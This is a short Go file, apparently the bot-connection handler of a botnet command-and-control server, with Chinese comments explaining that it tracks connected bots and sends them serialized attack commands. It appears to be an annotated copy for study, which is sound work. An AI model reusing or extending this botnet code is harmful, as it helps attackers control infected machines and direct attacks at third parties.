package main

import (
	"net"
	"time"
)

// Bot结构体【记录了某个bot的信息】
type Bot struct {
	uid     int
	conn    net.Conn
	version byte
	source  string
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
	return &Bot{-1, conn, version, source}
}

func (this *Bot) Handle() {
	clientList.AddClient(this)
	defer clientList.DelClient(this)

	buf := make([]byte, 2)
	for {
		this.conn.SetDeadline(time.Now().Add(180 * time.Second))
		if n, err := this.conn.Read(buf); err != nil || n != len(buf) {
			return
		}
		if n, err := this.conn.Write(buf); err != nil || n != len(buf) {
			return
		}
	}
}

//通过bot的conn连接，发送序列化攻击指令buf给bot
func (this *Bot) QueueBuf(buf []byte) {
	this.conn.Write(buf)
}
